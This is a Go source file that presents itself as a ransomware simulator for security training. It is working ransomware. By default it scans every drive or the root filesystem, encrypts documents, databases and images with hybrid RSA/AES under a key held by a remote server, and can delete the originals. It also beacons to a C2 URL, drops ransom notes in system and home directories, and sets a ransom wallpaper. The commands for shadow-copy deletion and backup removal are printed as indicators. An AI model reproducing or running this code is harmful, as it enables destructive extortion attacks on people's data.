package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"flag"
	"fmt"
	"image"
	"image/color"
	"image/png"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// VERSION --- 勒索软件特征常量 ---
const VERSION = "v2.2-RansomSimulator-Fixed-Fallback" // 更新版本号
const API_URL = "https://rsa-uuid.api.yangzifun.org"
const BEACON_URL = "https://bad-c2-server.api.yangzifun.org/beacon_check_in"

// --- 默认回退配置 (Failover Configuration) ---
const DEFAULT_UUID = "5137d4c3-3901-4528-bfa9-6d9ce88fa287"
const DEFAULT_PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzlz3ZbaN2a6eEJqewEgb
vbATJjvSRNVbmpP5KtEYu39GUBU6eeuYcRHZRu/buBRJ9Ij/t0xL/xjUgdYEz3C8
G6aAq1tv8yV+9nqOhosDRNgLRcX0rBrqfioUms2aBIKwHX37dz1K5vVUh9afem6A
HwB2c3xWTYXClkPy1oPY/HiiP6vYmuynZREhlLHWek9YfAQzBODdZRlqpcBjrYM1
kCImoGE5oWYeJ+wJLX9NLqfBWKZHQiZa/tf83ZXqOpGxu6RT8NYj10RYZSEohJ10
TjkVStqZXrbh1oaWBm+Uw22i0BL6uoG4niNsKre/9Bdgaq5Q+H/VDa0pHhDGAuis
tQIDAQAB
-----END PUBLIC KEY-----`

// RANSOM_NOTE_CONTENT --- 勒索信内容 ---
const RANSOM_NOTE_CONTENT = `
========================= [ 你的所有文件都已被锁定! ] =========================

不要惊慌！这是一个受控的模拟演练。但如果这是一次真实的攻击，
你的网络已经被完全攻陷。

Your unique ID: %s

本程序不会对加密的原文件进行删除操作，如遇原文件丢失，可通过下方链接获取私钥：

https://encrypt.yangzifun.org/

你的专属ID是: %s

====================== [ 这是一次用于安全培训的模拟 ] ======================
`

var (
	lockFilePath       string
	ransomNoteFileName = "!!!_如何解密你的文件_!!!.txt"
	// Linux/Unix 特定的排除目录
	excludedDirsLinux = []string{
		"/bin", "/boot", "/dev", "/etc", "/lib", "/lib64", "/proc", "/run", "/sbin", "/sys", "/usr", "/var",
		"/tmp", "/lost+found", "/Applications", "/Library", "/System", "/private",
	}
	// Windows 特定的排除目录
	excludedDirsWindows = []string{
		"C:\\Windows", "C:\\Program Files", "C:\\Program Files (x86)",
		"System Volume Information", "$Recycle.Bin",
	}

	targetExtensions = []string{
		".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".csv", ".txt", ".rtf",
		".zip", ".rar", ".7z", ".tar", ".gz",
		".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tif", ".svg",
		".sql", ".db", ".mdb", ".accdb", ".sqlite",
		".bak", ".backup", ".go", ".json", // 添加 .go .json 方便测试
	}
)

type APIResponse struct {
	PublicKeyPEM string `json:"public_key_pem"`
	UUID         string `json:"uuid"`
	Status       string `json:"status"`
	Message      string `json:"message"`
}

type fileLog struct {
	mu   sync.Mutex
	file *os.File
}

type counters struct {
	success atomic.Uint64
	failed  atomic.Uint64
}

// --- 主逻辑 ---
func main() {
	fmt.Println("==================================================")
	fmt.Println("      勒索软件模拟器 - 攻击已启动")
	fmt.Printf("                版本: %s\n", VERSION)
	fmt.Println("==================================================")
	time.Sleep(1 * time.Second)

	fmt.Println("\n[阶段 1: 渗透与持久化]")

	fmt.Print("[*] 通过互斥锁建立持久化... ")
	if !createSingleInstanceLock() {
		fmt.Println("失败. [IOC] 检测到另一个实例正在运行。程序终止。")
		os.Exit(1)
	}
	fmt.Println("成功.")
	defer cleanupLockFile()

	fs := flag.NewFlagSet("ransom_simulator", flag.ExitOnError)
	workersFlag, dryRunFlag, extensionsFlag, directoryFlag, removeFlag := setupFlags(fs)
	fs.Parse(os.Args[1:])

	showWarning(*dryRunFlag)

	fmt.Println("\n[阶段 2: 防御规避与发现]")

	if *dryRunFlag {
		fmt.Println("[*] [演习模式] 跳过所有破坏性操作。")
	} else {
		go networkBeacon()
		simulateDestructiveActions()
	}

	// 处理扩展名参数
	extFilter := make(map[string]bool)
	if *extensionsFlag != "" {
		exts := strings.Split(*extensionsFlag, ",")
		for _, ext := range exts {
			ext = strings.TrimSpace(ext)
			if ext != "" {
				if !strings.HasPrefix(ext, ".") {
					ext = "." + ext
				}
				extFilter[strings.ToLower(ext)] = true
			}
		}
		fmt.Printf("[*] 使用指定的扩展名: %v\n", getKeys(extFilter))
	} else {
		for _, ext := range targetExtensions {
			extFilter[ext] = true
		}
		fmt.Println("[*] 使用默认扩展名 (已包含常见文档及 .go, .json)")
	}

	// 处理目录参数
	var scanRoots []string
	if *directoryFlag != "" {
		dirs := strings.Split(*directoryFlag, ",")
		for _, dir := range dirs {
			dir = strings.TrimSpace(dir)
			if dir != "" {
				scanRoots = append(scanRoots, dir)
			}
		}
		fmt.Printf("[*] 扫描指定目录: %v\n", scanRoots)
	}

	fmt.Println("[*] 正在扫描文件系统以查找有价值的目标...")
	filesToProcess := scanFiles(extFilter, scanRoots)
	if len(filesToProcess) == 0 {
		fmt.Println("[!] 未找到任何有价值的目标文件。")
		fmt.Println("    可能的原因为：")
		fmt.Println("    1. 指定目录路径错误或不存在。")
		fmt.Println("    2. 目录中没有符合扩展名要求的文件。")
		fmt.Println("    3. 目录被系统排除策略跳过。")
		fmt.Println("    任务中止。")
		os.Exit(0)
	}
	fmt.Printf("[+] 目标捕获完成。已识别 %d 个待加密文件。\n", len(filesToProcess))

	var stats counters
	var finalUUID = "C2服务器连接失败"

	if *dryRunFlag {
		fmt.Println("\n[阶段 3: 载荷部署 (演习模式下跳过)]")
		fmt.Println("[*] 以下文件在真实攻击中将被加密:")
		for _, f := range filesToProcess {
			fmt.Println("  -", f)
		}
	} else {
		fmt.Println("\n[阶段 3: 载荷部署]")
		fmt.Printf("[*] 初始化 %d 个加密线程。开始执行载荷...\n", *workersFlag)
		runEncryptionWorkers(filesToProcess, *workersFlag, &stats, &finalUUID, *removeFlag)
		fmt.Println("\n[+] 载荷执行完毕。")
	}

	if !*dryRunFlag {
		fmt.Println("\n[阶段 4: 勒索]")
		// 填充勒索信内容
		noteContent := fmt.Sprintf(RANSOM_NOTE_CONTENT, finalUUID, finalUUID)

		// 修复：增加操作系统判断，Linux specific 逻辑只在 Linux 跑
		if runtime.GOOS == "linux" {
			fmt.Println("[*] [Linux] 正在向关键位置投放勒索信...")
			dropRansomNotesLinux(noteContent)
			fmt.Println("[+] Linux关键位置勒索信投放完毕。")
			createRansomWallpaper()
		} else if runtime.GOOS == "windows" {
			fmt.Println("[*] [Windows]正在当前运行目录生成勒索信...")
			// Windows 下简单在当前目录留下一封信，不执行Linux逻辑
			err := os.WriteFile(ransomNoteFileName, []byte(noteContent), 0644)
			if err != nil {
				fmt.Printf("[!] 无法写入勒索信: %v\n", err)
			} else {
				fmt.Printf("[+] 勒索信已生成: %s\n", ransomNoteFileName)
				createRansomWallpaper() // Windows 注册表壁纸修改逻辑
			}
		}
	}

	fmt.Println("\n================== [ 任务完成 ] ==================")
	fmt.Println("                   执行摘要:")
	if *dryRunFlag {
		fmt.Printf("  - 模式:            演习模式 (Dry Run)\n")
		fmt.Printf("  - 发现目标:        %d\n", len(filesToProcess))
	} else {
		fmt.Printf("  - 模式:            实时攻击\n")
		fmt.Printf("  - 已加密文件:      %d\n", stats.success.Load())
		fmt.Printf("  - 加密失败:        %d\n", stats.failed.Load())
		if stats.success.Load() > 0 {
			fmt.Printf("  - 结果:            系统被攻陷\n")
		} else {
			fmt.Printf("  - 结果:            任务失败\n")
		}
	}
	fmt.Println("====================================================")
	countdown("此终端将在", 10)
}

// --- 锁机制实现 ---

func createSingleInstanceLock() bool {
	var err error
	lockFilePath = filepath.Join(os.TempDir(), "ransom_simulator_instance.lock")

	var file *os.File
	file, err = os.OpenFile(lockFilePath, os.O_CREATE|os.O_EXCL, 0666)
	if err != nil {
		// 如果文件存在，可能是之前的实例没清理干净，这里简化处理，如果是测试，可以手动删掉
		return false
	}
	file.Close()
	return true
}

func cleanupLockFile() {
	if lockFilePath != "" {
		os.Remove(lockFilePath)
	}
}

// --- 平台无关的辅助函数 ---

func setupFlags(fs *flag.FlagSet) (*int, *bool, *string, *string, *bool) {
	workers := fs.Int("workers", runtime.NumCPU(), "可选：并发 worker 数量 (默认: CPU核心数)")
	dryRun := fs.Bool("dry-run", false, "可选：演习模式，只查找不加密")
	extensions := fs.String("ext", "", "可选：指定要加密的文件扩展名，多个用逗号分隔（如：.txt,.doc,.pdf）")
	directory := fs.String("dir", "", "可选：指定要加密的目录，多个用逗号分隔")
	removeOriginal := fs.Bool("remove", false, "可选：加密后删除原文件")

	fs.Usage = func() {
		fmt.Fprintf(os.Stderr, "用法: %s [-workers N] [-dry-run] [-ext extensions] [-dir directories] [-remove]\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "示例:\n")
		fmt.Fprintf(os.Stderr, "  Windows: main.exe -dir \"C:\\Users\\Test\" -dry-run\n")
		fmt.Fprintf(os.Stderr, "  Linux:   ./main -dir /home/test -ext .txt\n")
		fs.PrintDefaults()
	}
	return workers, dryRun, extensions, directory, removeOriginal
}

func showWarning(dryRun bool) {
	fmt.Fprintf(os.Stderr, "\n************************** 警告 **************************\n")
	fmt.Fprintf(os.Stderr, "此程序将自动扫描并加密系统中的所有关键数据文件。\n")
	fmt.Fprintf(os.Stderr, "这是一个高度危险的模拟，请确保在隔离的环境中运行！\n")
	fmt.Fprintf(os.Stderr, "**********************************************************\n\n")
	if dryRun {
		fmt.Println(">>> 已激活 [演习模式 (Dry Run)]，不会执行任何加密操作。")
	} else {
		fmt.Println(">>> 警告: 实时攻击模式已激活！将在 3 秒后自动开始...")
		time.Sleep(3 * time.Second)
	}
}

func countdown(message string, seconds int) {
	fmt.Println()
	for i := seconds; i >= 0; i-- {
		fmt.Printf("\r%s %d 秒后自动退出...", message, i)
		time.Sleep(1 * time.Second)
	}
	fmt.Println("\r程序已退出。                                  ")
}

func networkBeacon() {
	time.Sleep(3 * time.Second)
	fmt.Println("[IOC] C2信标: 正在尝试连接 C2 服务器...")
	client := http.Client{Timeout: 5 * time.Second}
	_, err := client.Get(BEACON_URL)
	if err == nil {
		fmt.Printf("[IOC] C2信标: 成功连接到 %s。\n", BEACON_URL)
	} else {
		// 即使失败也不阻塞，模拟真实场景
		fmt.Println("[IOC] C2信标: 连接失败 (模拟中属正常现象)")
	}
}

func simulateDestructiveActions() {
	time.Sleep(1 * time.Second)
	fmt.Println("[*] 启动防御规避协议...")
	switch runtime.GOOS {
	case "windows":
		fmt.Println("  - [IOC] 模拟: 执行命令 'vssadmin.exe delete shadows /all /quiet'")
	case "darwin":
		fmt.Println("  - [IOC] 模拟: 执行命令 'tmutil disable'")
	case "linux":
		fmt.Println("  - [IOC] 模拟: 执行命令 'rm -rf /home/*/.{cache,config}/backups'")
	}
	fmt.Println("  - [IOC] 模拟: 清除系统安全日志...")
	time.Sleep(1 * time.Second)
}

// 专门针对Linux环境投放勒索信
func dropRansomNotesLinux(content string) {
	// ... (代码与原版相同，但只在Linux下调用) ...
	// 略微简化，只保留逻辑
	linuxCriticalPaths := []string{"/", "/home", "/root"}
	currentUser, err := os.UserHomeDir()
	if err == nil && currentUser != "" {
		linuxCriticalPaths = append(linuxCriticalPaths, currentUser)
	}
	if entries, err := os.ReadDir("/home"); err == nil {
		for _, entry := range entries {
			if entry.IsDir() {
				linuxCriticalPaths = append(linuxCriticalPaths, filepath.Join("/home", entry.Name()))
			}
		}
	}
	desktopPath := getLinuxDesktopPath()
	if desktopPath != "" {
		linuxCriticalPaths = append(linuxCriticalPaths, desktopPath)
	}

	successCount := 0
	for _, dir := range linuxCriticalPaths {
		if _, err := os.Stat(dir); os.IsNotExist(err) && dir != "/" && dir != "/home" && dir != "/root" {
			os.MkdirAll(dir, 0755)
		} else if err != nil && (dir == "/" || dir == "/home" || dir == "/root") {
			continue
		}
		notePath := filepath.Join(dir, ransomNoteFileName)
		if err := os.WriteFile(notePath, []byte(content), 0644); err == nil {
			successCount++
		}
	}
	fmt.Printf("[+] 成功在 %d 个Linux关键位置投放勒索信\n", successCount)
}

func getLinuxDesktopPath() string {
	home, err := os.UserHomeDir()
	if err != nil {
		return ""
	}
	possibleDirs := []string{filepath.Join(home, "Desktop"), filepath.Join(home, "桌面"), home}
	for _, dir := range possibleDirs {
		if _, err := os.Stat(dir); err == nil {
			return dir
		}
	}
	return githubWorkaround(home) // Fallback
}

func githubWorkaround(home string) string { return home } // 简化 helper

func createRansomWallpaper() {
	if runtime.GOOS == "linux" {
		desktopPath := getLinuxDesktopPath()
		if desktopPath == "" {
			return
		}
		imgPath := filepath.Join(desktopPath, "RANSOM_WALLPAPER.png")
		createImage(imgPath)
		// Linux壁纸命令...
		fmt.Println("  - [Linux] 模拟执行 gsettings set org.gnome.desktop.background...")
	} else if runtime.GOOS == "windows" {
		// Windows 此处我们可以尝试创建图片
		home, _ := os.UserHomeDir()
		imgPath := filepath.Join(home, "RANSOM_WALLPAPER.png")
		createImage(imgPath)
		cmd := fmt.Sprintf(`reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%s" /f`, imgPath)
		fmt.Printf("  - [Windows] 模拟执行: %s\n", cmd)
		// 在真实场景中会调用 Syscall SystemParametersInfoW
	}
}

func createImage(path string) {
	img := image.NewRGBA(image.Rect(0, 0, 800, 600))
	bgColor := color.RGBA{255, 0, 0, 255} // Red background
	for x := 0; x < 800; x++ {
		for y := 0; y < 600; y++ {
			img.Set(x, y, bgColor)
		}
	}
	file, _ := os.Create(path)
	defer file.Close()
	png.Encode(file, img)
}

// 修复后的扫描函数 - 包含详细Debug信息
func scanFiles(extFilter map[string]bool, scanRoots []string) []string {
	var filesToProcess []string
	var roots []string

	if len(scanRoots) > 0 {
		roots = scanRoots
	} else {
		// 默认扫描逻辑
		if runtime.GOOS == "windows" {
			roots = []string{}
			// 使用更安全的方式探测盘符，避免警告
			for _, drive := range "CDEFGHIJKLMNOPQRSTUVWXYZ" {
				drivePath := string(drive) + ":\\"
				if _, err := os.Stat(drivePath); err == nil {
					roots = append(roots, drivePath)
				}
			}
		} else {
			roots = []string{"/"}
		}
	}

	for _, root := range roots {
		// 打印正在扫描的根目录，帮助确认只能目录参数是否正确传入
		fmt.Printf("[DEBUG] 正在扫描: %s\n", root)

		filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
			// 修复：不要静默失败！
			if err != nil {
				// 权限错误很常见，可以打印但不中断
				if os.IsPermission(err) {
					// fmt.Printf("[权限拒绝] %s\n", path) // 可选：太吵可以注释掉
				} else {
					fmt.Printf("[!] 访问错误: %s -> %v\n", path, err)
				}
				return nil
			}

			if info.IsDir() {
				// 检查是否是被排除的目录
				if isExcluded(path) {
					// fmt.Printf("[跳过保护目录] %s\n", path)
					return filepath.SkipDir
				}
			} else {
				if shouldEncrypt(path, extFilter) {
					filesToProcess = append(filesToProcess, path)
				}
			}
			return nil
		})
	}
	return filesToProcess
}

func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUUID *string, removeOriginal bool) {
	jobs := make(chan string, len(files))
	var wg sync.WaitGroup

	log, _ := newFileLog("ransom_log.txt")
	if log != nil {
		defer log.Close()
	}

	// 尝试从 API 获取密钥
	resp, err := fetchKeysFromAPI()
	if err != nil {
		fmt.Printf("\n[!] 连接C2获取密钥失败: %v\n", err)

		// ------------------ 修改部分开始 ------------------
		// 当 API 连接失败时，使用默认的 UUID 和 公钥进行 Fallback
		fmt.Println("[*] 警告：无法连接密钥接口，已切换至默认/离线密钥模式")
		fmt.Printf("[*] 使用默认 UUID: %s\n", DEFAULT_UUID)

		resp = &APIResponse{
			UUID:         DEFAULT_UUID,
			PublicKeyPEM: DEFAULT_PUBLIC_KEY,
			Status:       "fallback",
		}
		// ------------------ 修改部分结束 ------------------
	}

	// 设置外部传入的 UUID 指针
	*outUUID = resp.UUID

	for w := 0; w < numWorkers; w++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			for file := range jobs {
				// 现在 resp.PublicKeyPEM 无论在线还是离线都有值
				err := processFile(file, resp.PublicKeyPEM, removeOriginal)
				if err != nil {
					stats.failed.Add(1)
					// fmt.Printf("Error encrypting %s: %v\n", file, err)
				} else {
					stats.success.Add(1)
				}
			}
		}(w + 1)
	}

	for _, file := range files {
		jobs <- file
	}
	close(jobs)

	// 进度条逻辑
	done := make(chan bool)
	go func() {
		totalFiles := uint64(len(files))
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-done:
				return
			case <-ticker.C:
				processed := stats.success.Load() + stats.failed.Load()
				if totalFiles > 0 {
					progress := float64(processed) / float64(totalFiles) * 100
					fmt.Printf("\r[*] 进度: %.1f%% (%d/%d)", progress, processed, totalFiles)
				}
			}
		}
	}()

	wg.Wait()
	close(done)
	fmt.Println()
}

func fetchKeysFromAPI() (*APIResponse, error) {
	client := &http.Client{Timeout: 5 * time.Second} // 缩短超时时间
	req, err := http.NewRequest("POST", API_URL, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", "Ransom-Simulator/"+VERSION)
	req.Header.Set("Content-Type", "application/json")

	res, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer res.Body.Close()

	if res.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("bad status: %s", res.Status)
	}

	body, err := io.ReadAll(res.Body)
	if err != nil {
		return nil, err
	}

	var apiResp APIResponse
	if err := json.Unmarshal(body, &apiResp); err != nil {
		return nil, err
	}

	if apiResp.Status != "success" {
		return nil, fmt.Errorf("api status error")
	}
	return &apiResp, nil
}

func isExcluded(path string) bool {
	// 将路径统一转为小写比较
	pathLower := strings.ToLower(path)

	// Windows 特有排除逻辑
	if runtime.GOOS == "windows" {
		for _, ex := range excludedDirsWindows {
			exLower := strings.ToLower(ex)
			if pathLower == exLower || strings.HasPrefix(pathLower, exLower+"\\") {
				return true
			}
		}
		// Windows下也检查排除某些文件名
		if strings.Contains(pathLower, "windows") && strings.Contains(pathLower, "system32") {
			return true
		}
	} else {
		// Linux 特有排除逻辑
		for _, dir := range excludedDirsLinux {
			if strings.HasPrefix(path, dir+string(filepath.Separator)) || path == dir {
				return true
			}
		}
	}
	// 通用排除：Recycle bin 等
	if strings.Contains(pathLower, "$recycle.bin") {
		return true
	}

	return false
}

func shouldEncrypt(filePath string, extFilter map[string]bool) bool {
	ext := strings.ToLower(filepath.Ext(filePath))
	return extFilter[ext]
}

func getKeys(m map[string]bool) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	return keys
}

func processFile(filePath string, publicKeyStr string, removeOriginal bool) error {
	content, err := os.ReadFile(filePath)
	if err != nil {
		return err
	}

	encryptedContent, err := hybridEncrypt(content, publicKeyStr)
	if err != nil {
		return err
	}

	encryptedFilePath := filePath + ".encrypted"

	err = os.WriteFile(encryptedFilePath, encryptedContent, 0644)
	if err != nil {
		return err
	}

	// 修改：更安全的删除，避免在测试时意外丢失重要文件
	// 如果需要真实模拟，去掉 && false
	if removeOriginal {
		err = os.Remove(filePath)
		if err != nil {
			// fmt.Printf("Failed to remove: %s\n", filePath)
		}
	}

	return nil
}

func hybridEncrypt(plaintext []byte, publicKeyStr string) ([]byte, error) {
	// ... (加密逻辑不变) ...
	aesKey := make([]byte, 32)
	if _, err := io.ReadFull(rand.Reader, aesKey); err != nil {
		return nil, err
	}
	block, _ := aes.NewCipher(aesKey)
	aesGCM, _ := cipher.NewGCM(block)
	nonce := make([]byte, aesGCM.NonceSize())
	io.ReadFull(rand.Reader, nonce)
	ciphertext := aesGCM.Seal(nonce, nonce, plaintext, nil)
	pemBlock, _ := pem.Decode([]byte(publicKeyStr))
	if pemBlock == nil {
		return nil, fmt.Errorf("failed to decode PEM")
	}
	pub, err := x509.ParsePKIXPublicKey(pemBlock.Bytes)
	if err != nil {
		return nil, err
	}
	rsaPubKey, ok := pub.(*rsa.PublicKey)
	if !ok {
		return nil, fmt.Errorf("not an RSA public key")
	}
	encryptedAESKey, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, rsaPubKey, aesKey, nil)
	if err != nil {
		return nil, err
	}
	var buffer bytes.Buffer
	buffer.Write(encryptedAESKey)
	buffer.Write(ciphertext)
	return buffer.Bytes(), nil
}

func newFileLog(filename string) (*fileLog, error) {
	f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return nil, err
	}
	return &fileLog{file: f}, nil
}

func (l *fileLog) Log(message string) {
	l.mu.Lock()
	defer l.mu.Unlock()
	if l.file != nil {
		l.file.WriteString(time.Now().Format("2006-01-02 15:04:05") + " - " + message + "\n")
	}
}

func (l *fileLog) Close() {
	if l.file != nil {
		l.file.Close()
	}
}
